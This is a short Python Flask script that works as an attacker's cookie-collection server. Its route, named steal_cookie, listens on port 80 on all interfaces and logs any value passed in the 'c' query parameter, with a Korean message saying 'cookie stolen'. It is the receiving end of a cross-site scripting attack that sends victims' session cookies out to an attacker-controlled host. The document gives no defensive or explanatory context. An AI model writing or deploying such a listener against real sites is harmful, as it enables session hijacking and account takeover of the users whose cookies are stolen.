from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def steal_cookie():
    cookie = request.args.get('c')
    print(f'[!] 쿠키 탈취됨: {cookie}')
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
